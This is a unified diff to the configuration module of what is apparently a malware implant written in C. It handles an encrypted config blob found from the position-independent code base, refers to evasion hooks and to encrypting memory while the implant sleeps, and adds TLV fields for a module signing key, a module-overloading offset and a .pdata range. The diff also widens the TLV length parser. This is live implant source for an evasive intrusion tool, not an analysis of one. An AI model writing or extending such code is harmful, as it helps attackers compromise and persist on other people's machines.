@@ -23,6 +23,7 @@ static IMPLANT_CONFIG g_config;
  * stack frame reuse (the decrypted buffer in cfg_init is on the stack). */
 #define MAX_PROFILE_BLOB 4096
 static BYTE g_profile_blob_buf[MAX_PROFILE_BLOB];
+#define CONFIG_DECRYPT_MAX          (sizeof(IMPLANT_CONFIG) + 128)
 
 /* ================================================================== */
 /*  Per-build config magic — derived from CRC32 of PIC header          */
@@ -38,6 +39,7 @@ static BYTE g_profile_blob_buf[MAX_PROFILE_BLOB];
 
 /* Forward declaration — defined below */
 static PVOID cfg_get_pic_base(void);
+static CONFIG_BLOB_HEADER *cfg_find_blob(PVOID pic_base);
 
 /* CRC32 computation — same algorithm as evasion_compute_crc() in hooks.c */
 static DWORD cfg_compute_crc32(const BYTE *data, DWORD len) {
@@ -60,6 +62,20 @@ DWORD cfg_get_magic(void) {
         return 0;
     DWORD len = 64;  /* CONFIG_KEY_INPUT_SIZE */
     return cfg_compute_crc32((const BYTE *)pic_base, len);
+}
+
+SIZE_T cfg_get_payload_size(void) {
+    PVOID pic_base = cfg_get_pic_base();
+    if (!pic_base)
+        return 0;
+
+    CONFIG_BLOB_HEADER *hdr = cfg_find_blob(pic_base);
+    if (!hdr)
+        return 0;
+
+    return (SIZE_T)((BYTE *)hdr - (BYTE *)pic_base)
+        + sizeof(CONFIG_BLOB_HEADER)
+        + (SIZE_T)hdr->data_size;
 }
 
 /* In-memory encryption state (used during sleep) */
@@ -142,7 +158,7 @@ static CONFIG_BLOB_HEADER *cfg_find_blob(PVOID pic_base) {
             CONFIG_BLOB_HEADER *hdr = (CONFIG_BLOB_HEADER *)(p + i);
             if (hdr->version == CONFIG_VERSION &&
                 hdr->data_size > 0 &&
-                hdr->data_size <= sizeof(IMPLANT_CONFIG) + 64) {
+                hdr->data_size <= CONFIG_DECRYPT_MAX) {
                 return hdr;
             }
         }
@@ -181,7 +197,7 @@ NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) {
     BYTE *enc_data = (BYTE *)hdr + sizeof(CONFIG_BLOB_HEADER);
 
     /* AAD = magic + version (first 8 bytes of header) */
-    BYTE decrypted[sizeof(IMPLANT_CONFIG)];
+    BYTE decrypted[CONFIG_DECRYPT_MAX];
     spec_memset(decrypted, 0, sizeof(decrypted));
 
     BOOL ok = spec_aead_decrypt(key, hdr->nonce,
@@ -297,14 +313,20 @@ NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
 #define CFG_TLV_EVASION_FLAGS       0x88
 #define CFG_TLV_IMPLANT_PUBKEY      0x89
 #define CFG_TLV_BUILD_FLAGS         0x8A
+#define CFG_TLV_MODULE_RW_OFFSET    0x8B
+#define CFG_TLV_PDATA_RANGE         0x8C
+#define CFG_TLV_MODULE_SIGNING_KEY  0x8D
 
 static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) {
     DWORD pos = 0;
 
-    while (pos + 3 <= len) {
+    while (pos + 5 <= len) {
         BYTE fid = data[pos];
-        WORD vlen = (WORD)data[pos + 1] | ((WORD)data[pos + 2] << 8);
-        pos += 3;
+        DWORD vlen = (DWORD)data[pos + 1] |
+                     ((DWORD)data[pos + 2] << 8) |
+                     ((DWORD)data[pos + 3] << 16) |
+                     ((DWORD)data[pos + 4] << 24);
+        pos += 5;
 
         if (pos + vlen > len)
             break;  /* Truncated TLV — stop parsing */
@@ -325,6 +347,11 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
         case CFG_TLV_IMPLANT_PUBKEY:
             if (vlen == 32)
                 spec_memcpy(cfg->implant_pubkey, val, 32);
+            break;
+
+        case CFG_TLV_MODULE_SIGNING_KEY:
+            if (vlen == 32)
+                spec_memcpy(cfg->module_signing_key, val, 32);
             break;
 
         case CFG_TLV_CHANNEL_KIND: {
@@ -469,6 +496,18 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
             /* Builder sends 1 byte bitfield: 0x01=debug, 0x02=skip_aa */
             if (vlen >= 1)
                 cfg->build_flags = (DWORD)val[0];
+            break;
+
+        case CFG_TLV_MODULE_RW_OFFSET:
+            if (vlen >= 4)
+                cfg->module_overload_rw_offset = *(const DWORD *)val;
+            break;
+
+        case CFG_TLV_PDATA_RANGE:
+            if (vlen >= 8) {
+                cfg->pdata_offset = *(const DWORD *)val;
+                cfg->pdata_count = *(const DWORD *)(val + 4);
+            }
             break;
 
         default:
